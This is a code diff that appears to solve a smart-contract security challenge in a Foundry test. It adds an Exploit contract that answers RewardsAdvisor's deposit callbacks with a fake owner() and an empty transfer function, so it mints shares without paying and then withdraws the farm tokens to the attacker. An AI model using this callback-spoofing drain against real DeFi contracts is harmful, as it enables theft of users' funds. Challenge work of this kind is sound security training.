@@ -65,7 +65,10 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
         
         // implement solution here
-
+        //same exploit as challenge 6
+        //We can skip some check because the rewardsAdvisor will call our contract at some moment
+        Exploit _exploit = new Exploit(address(rewardsAdvisor),address(farm),address(govToken));
+        _exploit.pwn(address(adminUser));
         vm.stopPrank();
         validation();
     }
@@ -79,4 +82,42 @@ contract Testing is Test {
 
     }
 
+}
+
+contract Exploit {
+
+    Token farm;
+    GovToken govToken;
+    RewardsAdvisor rewardsAdvisor;
+    address private attacker;
+    
+    constructor(address _target, address _farm, address _xfarm){
+        farm = Token(_farm);
+        govToken = GovToken(_xfarm);
+        rewardsAdvisor = RewardsAdvisor(_target);
+        attacker = msg.sender;
+
+    }
+
+    //Will be called during deposit()
+    function owner() external returns (address){
+        return address(this);
+    }
+
+    //Will be called during deposit()
+    function delegatedTransferERC20(address token, address to, uint256 amount) external {
+
+    }
+
+    //Deposit() will call our contract and so we will skip some process like the transfer of farm token
+    function pwn(address _target) external{
+        //owner = address(this);
+        uint256 amount = govToken.balanceOf(address(_target)) * uint256(10000) / uint256(1);
+        console.log("amount shares we want : " ,amount);
+        rewardsAdvisor.deposit(amount,payable(address(this)),address(this));
+        console.log("amount shares exploit got : " ,govToken.balanceOf(address(this)));
+        rewardsAdvisor.withdraw(govToken.balanceOf(address(this)),attacker,payable(address(this)));
+        console.log("amount farm attacker got : " ,farm.balanceOf(address(attacker)));
+        //farm.transfer(owner,farm.balanceOf(address(this)));
+    }
 }
